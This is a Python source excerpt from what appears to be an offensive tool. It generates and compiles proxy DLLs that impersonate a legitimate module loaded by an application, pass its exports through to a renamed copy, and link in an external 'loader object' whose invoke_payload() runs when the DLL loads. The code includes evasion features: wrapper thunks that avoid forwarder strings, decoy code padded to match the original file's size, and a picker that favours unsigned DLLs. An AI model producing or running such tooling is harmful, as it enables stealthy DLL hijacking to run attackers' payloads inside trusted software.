def generate_proxy(dll_path: str, out_dir: str, orig_name: str,
                   style: str = "forward", junk: bool = False,
                   seed: int | None = None,
                   payload_obj: str | None = None) -> tuple[list[str], dict]:
    """Write the scaffold into out_dir. Returns (created paths, info) where
    info records the sizing choices for the caller's summary. payload_obj,
    when given, is a loader object linked in by the Makefile; its single
    contract is void invoke_payload(void), called from payload()."""
    if style not in STYLES:
        raise ValueError(f"style must be one of {STYLES}")
    dll_name = os.path.basename(dll_path)
    stem = os.path.splitext(dll_name)[0]
    forward_module = os.path.splitext(orig_name)[0]
    target_size = os.path.getsize(dll_path)

    if seed is None:
        seed = random.randrange(1 << 32)
    rng = random.Random(seed)

    exports, machine = read_exports(dll_path)
    triple, arch_label, arch64 = MACHINES.get(
        machine, ("x86_64-w64-mingw32", "x64", True))

    # Smell test: an input whose export names largely carry a 't_' prefix
    # is almost certainly someone else's proxy DLL whose generator exported
    # its internal wrapper names as-is. Proxying it would re-export those
    # mangled names and satisfy nobody's import table.
    named = [n for n, _ in exports if n is not None]
    t_pref = sum(1 for n in named if n.startswith("t_"))
    looks_like_proxy = t_pref >= 3 and t_pref * 4 >= max(1, len(named))

    os.makedirs(out_dir, exist_ok=True)
    created = []

    orig_dst = os.path.join(out_dir, orig_name)
    shutil.copy2(dll_path, orig_dst)
    created.append(orig_dst)

    if style == "call":
        c_body, bulk_count = _proxy_c_call(exports, dll_name, orig_name,
                                           seed, junk, rng, target_size,
                                           payload_obj)
        thunks = []
        for name, ordinal in exports:
            label = _sanitize(name) if name is not None else f"ord_{ordinal}"
            thunks.append(_thunk_asm(f"t_{label}", f"fp_{label}", arch64,
                                     junk, rng))
        c_src = "\n".join(c_body) + "\n" + "\n".join(thunks)
        def_lines = _def_lines_call(exports)
    else:
        c_src, bulk_count = _proxy_c_forward(dll_name, orig_name, seed, junk,
                                             rng, target_size, payload_obj)
        def_lines = _def_lines_forward(exports, forward_module)

    c_path = os.path.join(out_dir, "proxy.c")
    with open(c_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(c_src)
    created.append(c_path)

    def_path = os.path.join(out_dir, "proxy.def")
    with open(def_path, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(def_lines) + "\n")
    created.append(def_path)

    mk_path = os.path.join(out_dir, "Makefile")
    if payload_obj:
        loader_assign = (f"\nLOADER_OBJ := {payload_obj.replace(chr(92), '/')}\n"
                         "# contract: void invoke_payload(void) "
                         "(extern \"C\" if C++)\n"
                         f"# arch must match this DLL ({arch_label}); "
                         "override with: make LOADER_OBJ=/path/to/other.o")
        loader_dep = " $(LOADER_OBJ)"
        loader_link = " $(LOADER_OBJ)"
    else:
        loader_assign = loader_dep = loader_link = ""
    with open(mk_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(MAKEFILE_TEMPLATE.format(
            dll_name=dll_name, triple=triple, arch_label=arch_label,
            style=style,
            loader_assign=loader_assign, loader_dep=loader_dep,
            loader_link=loader_link,
            msvc_note=("\n# MSVC alternative: cl /LD proxy.c /link"
                       " /DEF:proxy.def /OUT:" + dll_name
                       if style == "forward" else
                       "\n# (MSVC cannot build the wrapper thunks;"
                       " use mingw-w64.)")))
    created.append(mk_path)

    rd_path = os.path.join(out_dir, "README.txt")
    with open(rd_path, "w", encoding="utf-8", newline="\n") as f:
        if style == "forward":
            def_desc = ("Forwarders: every export of the original is"
                        " re-exported under its original name and ordinal.")
            style_notes = ("  The export table contains forwarder strings"
                           " pointing into " + orig_name + "; the loader"
                           " binds each import straight to the original.")
        else:
            def_desc = ("Maps every export name/ordinal to a real wrapper"
                        " function in proxy.c.")
            style_notes = ("  Each export is a genuine function in .text that"
                           " calls the resolved address in " + orig_name +
                           ".\n  No forwarder strings exist anywhere in the"
                           " binary; the resolver table and GetProcAddress"
                           " do the binding at load time.")
        f.write(README_TEMPLATE.format(
            dll_name=dll_name, orig_name=orig_name,
            orig_name_padded=orig_name + " " * max(0, 9 - len(orig_name)),
            arch_label=arch_label, style=style, def_desc=def_desc,
            style_notes=style_notes,
            payload_line=("" if not payload_obj else
                          "Linked loader\n"
                          "  payload() calls invoke_payload() from LOADER_OBJ "
                          "(see Makefile).\n"
                          "  Your loader builds independently; the sole "
                          "contract is that one\n"
                          "  function — extern \"C\" void invoke_payload(void), "
                          f"matching arch ({arch_label})."),
            step1=("Add your loader call inside payload() in proxy.c."
                   if not payload_obj else
                   "Build your loader object (LOADER_OBJ in the Makefile) — "
                   "payload() already calls invoke_payload()."),
            decoy_line=("\n               Decoy code targets the original's"
                        " file size with thousands of generated\n"
                        "               support functions. DllMain gates all"
                        " decoy init behind a never-taken\n"
                        "               runtime check (clock == FILETIME"
                        " epoch), so only payload() runs." if junk
                        else ""),
            exports_line=(f"{len(exports)} export(s) proxied."
                          if exports else
                          "WARNING: this DLL has no exports — the host loads "
                          "it for its side effects; the proxy is"
                          " DllMain-only."),
            data_export_note=("Call-style wrappers assume exports are"
                              " functions; exports that are plain data are"
                              " only safe in forward style."
                              if style == "call" else
                              "Forwarders carry data exports correctly."),
            seed=seed))
    created.append(rd_path)

    info = {
        "dll_name": dll_name,
        "orig_size": target_size,
        "decoy_functions": bulk_count,
        "style": style,
        "junk": junk,
        "seed": seed,
        "payload_obj": payload_obj,
    }
    if looks_like_proxy:
        info["t_prefixed_exports"] = t_pref
    return created, info


def _try_build(out_dir: str, payload_obj: str | None,
               build: bool = True) -> str | None:
    """Run make in out_dir and return the built DLL's absolute path,
    or None when the build was skipped/failed (reason already printed)."""
    if not build:
        return None
    if payload_obj and not os.path.isfile(payload_obj):
        console.print("[yellow]build skipped: loader object not built yet — "
                      "run make yourself once it exists[/yellow]")
        return None
    make = shutil.which("make") or shutil.which("mingw32-make")
    if not make:
        console.print("[yellow]build skipped: make not found on PATH — "
                      "run it yourself in the output folder[/yellow]")
        return None
    cc = ""
    try:
        for line in open(os.path.join(out_dir, "Makefile"),
                         encoding="utf-8"):
            m = re.match(r"^CC\s*:=\s*(\S+)", line)
            if m:
                cc = m.group(1)
                break
    except OSError:
        pass
    if cc and not shutil.which(cc):
        console.print(f"[yellow]build skipped: {cc} not found on PATH — "
                      f"install mingw-w64 and re-run make in the output "
                      f"folder[/yellow]")
        return None
    try:
        proc = subprocess.run([make], cwd=out_dir, capture_output=True,
                              text=True, timeout=900)
    except subprocess.TimeoutExpired:
        console.print("[red]build timed out after 900s — "
                      "run make yourself in the output folder[/red]")
        return None
    except OSError as exc:
        console.print(f"[red]build failed to start: {exc}[/red]")
        return None
    # The Makefile's TARGET line names the output; pull it back out.
    dll = None
    try:
        for line in open(os.path.join(out_dir, "Makefile"),
                         encoding="utf-8"):
            m = re.match(r"^TARGET\s*:=\s*(\S+)", line)
            if m:
                dll = os.path.join(out_dir, m.group(1))
                break
    except OSError:
        pass
    if proc.returncode == 0 and dll and os.path.isfile(dll):
        return os.path.abspath(dll)
    console.print("[red]make failed — its last words:[/red]")
    tail = (proc.stdout + "\n" + proc.stderr).strip().splitlines()
    for line in tail[-10:]:
        console.print(f"  {line}")
    console.print(f"[dim]fix the error and re-run make in {out_dir}[/dim]")
    return None


def _default_orig_name(dll_name: str) -> str:
    stem, ext = os.path.splitext(dll_name)
    return f"{stem}_orig{ext or '.dll'}"


def run_proxy_flow(mods, proxy_flag: str, proxy_dir_flag: str,
                   proxy_name_flag: str, style_flag: str = "",
                   junk_flag: bool = False,
                   payload_obj_flag: str | None = None,
                   build: bool = True,
                   unsigned_paths: set[str] | None = None) -> None:
    """Entry point after a report: use the --proxy flags if given, otherwise
    interactively ask (yes/no → which DLL → where → renamed to what →
    style → decoy code → loader object) and generate the scaffold; then
    run make (unless --no-build) and show where the DLL landed.

    unsigned_paths, when not None, is the report's verified unsigned-PE
    set; it feeds the picker's green "(unsigned)" entries.  None means
    the report never checked signatures, so the picker checks lazily."""
    candidates: list[str] = []
    for m in mods:
        if m.dll_path and m.dll_path not in candidates:
            candidates.append(m.dll_path)

    if proxy_flag:
        dll_path = proxy_flag
        if not os.path.isfile(dll_path):
            console.print(f"[red]error: --proxy: no file at {dll_path}[/red]")
            return
        out_dir = proxy_dir_flag or os.getcwd()
        orig_name = proxy_name_flag or _default_orig_name(
            os.path.basename(dll_path))
        style = style_flag or "forward"
        junk = junk_flag
        payload_obj = payload_obj_flag or None
    else:
        import sys
        if not sys.stdin.isatty():
            return  # nothing asked for, no terminal to ask on
        dll_path, out_dir, orig_name, style, junk = _ask(candidates,
                                                        unsigned_paths)
        if dll_path is None:
            return
        answer = questionary.path(
            "Loader object to link — must define invoke_payload()"
            " (empty = none)", qmark="❯").ask()
        if answer is None:
            return  # cancelled
        payload_obj = answer.strip().strip("\"\'") or None

    created, info = generate_proxy(dll_path, out_dir, orig_name, style, junk,
                                   payload_obj=payload_obj)

    dll_name = os.path.basename(dll_path)
    signed, _ = is_signed(dll_path)
    note = ("" if not signed else
            "\n[yellow]note: the original is signed — your proxy replaces it "
            "in the load path, so the app now loads an unsigned DLL; that is "
            "the point, but expect the Unsigned indicator to light up.[/yellow]")
    size_line = ""
    if junk and info["decoy_functions"]:
        size_line = (f"\n[dim]decoy mass targets the original's size: "
                     f"{info['decoy_functions']} generated functions ≈ "
                     f"{info['orig_size'] // 1024} KB of compiled code[/dim]")
    smell = ("" if "t_prefixed_exports" not in info else
             f"\n[red]warning: {info['t_prefixed_exports']} of this input's "
             f"exports are 't_'-prefixed — it is probably ALREADY a proxy "
             f"DLL.\nProxying it re-exports the mangled names, so hosts "
             f"importing the real API will fail to resolve.\nStart from a "
             f"clean copy of the original instead.[/red]")
    loader_line = ""
    if info.get("payload_obj"):
        found = os.path.isfile(info["payload_obj"])
        loader_line = (f"\n[dim]links external loader: {info['payload_obj']} "
                       f"— payload() calls invoke_payload()[/dim]"
                       + ("" if found else
                          "\n[yellow](not found yet — build it before "
                          "running make)[/yellow]"))
    console.print()
    console.print(Panel(
        f"[bold]{dll_name}[/bold] → proxy ({style} style"
        f"{' + decoy' if junk else ''}) forwards to [bold]{orig_name}[/bold]"
        f"\n[dim]original untouched at {dll_path}[/dim]{smell}{loader_line}"
        f"{note}{size_line}",
        title=Text("PROXY SCAFFOLD CREATED", style="bold green"),
        expand=False))
    table = Table(box=box.SIMPLE, pad_edge=False, show_header=False)
    table.add_column(style="green")
    table.add_column(overflow="fold")
    for p in created:
        table.add_row("created", p)
    console.print(table)
    if info.get("payload_obj") and not os.path.isfile(info["payload_obj"]):
        console.print("[dim]next: build your loader object, then deploy as "
                      "described in README.txt[/dim]")
    else:
        console.print("[dim]next: deploy as described in README.txt[/dim]")
    dll_built = _try_build(out_dir, info.get("payload_obj"), build)
    if dll_built:
        console.print()
        console.print(Panel(
            f"[bold green]{dll_built}[/bold green]\n"
            f"[dim]built and ready — deploy as described in "
            f"README.txt[/dim]",
            title=Text("PROXY DLL COMPILED", style="bold green"),
            expand=False))


def _ask(candidates: list[str], unsigned_paths: set[str] | None = None):
    """Interactive prompts; returns (dll_path, out_dir, orig_name, style,
    junk) or (None, None, None, None, None) when cancelled."""
    if not candidates:
        console.print("\n[dim]no loaded DLLs to proxy — nothing was still "
                      "alive to inspect[/dim]")
        return None, None, None, None, None

    if not questionary.confirm(
            "Create a proxy DLL for one of the loaded modules?",
            default=False, qmark="❯").ask():
        return None, None, None, None, None

    # Unsigned DLLs are the interesting proxies (no signature to break),
    # so they lead the list in green.  When the report already ran the
    # signature check its result is reused; otherwise check here.
    if unsigned_paths is None:
        from procwatch import is_signed
        unsigned_paths = set()
        for path in candidates:
            signed, _err = is_signed(path)
            if not signed:
                unsigned_paths.add(path)
    unsigned_lower = {p.lower() for p in unsigned_paths}

    choices = []
    for path in sorted(candidates,
                       key=lambda p: (p.lower() not in unsigned_lower,
                                      os.path.basename(p).lower())):
        label = os.path.basename(path)
        if path.lower() in unsigned_lower:
            # List-of-tuples titles carry their own style; "ansigreen" is an
            # inline color, valid without a stylesheet entry.
            title = [("bold ansigreen", f"{label} (unsigned)"),
                     ("", f"  —  {path}")]
        else:
            title = f"{label}  —  {path}"
        choices.append(questionary.Choice(title=title, value=path))
    dll_path = questionary.select(
        "Which DLL should the proxy impersonate?",
        choices=choices, qmark="❯").ask()
    if dll_path is None:
        return None, None, None, None, None

    dll_name = os.path.basename(dll_path)
    out_dir = questionary.text(
        "Output folder (empty = current working folder)",
        default="", qmark="❯").ask()
    if out_dir is None:
        return None, None, None, None, None
    out_dir = out_dir.strip().strip('"\'') or os.getcwd()

    orig_name = questionary.text(
        f"Rename the legitimate copy to (default {_default_orig_name(dll_name)!r})",
        default=_default_orig_name(dll_name), qmark="❯").ask()
    if orig_name is None:
        return None, None, None, None, None
    orig_name = os.path.basename(orig_name.strip().strip('"\'')) \
        or _default_orig_name(dll_name)

    style = questionary.select(
        "Export style?",
        choices=[
            questionary.Choice(
                title="forwarders — export table points at the original "
                      "(simplest, MSVC-compatible)",
                value="forward"),
            questionary.Choice(
                title="wrappers — real functions that call the original "
                      "(no forwarder strings anywhere)",
                value="call",
            ),
        ], qmark="❯").ask()
    if style is None:
        return None, None, None, None, None

    junk = questionary.confirm(
        "Add benign decoy code? (utility functions, tables, DllMain init)",
        default=False, qmark="❯").ask()
    if junk is None:
        return None, None, None, None, None

    console.print()
    return dll_path, out_dir, orig_name, style, bool(junk)
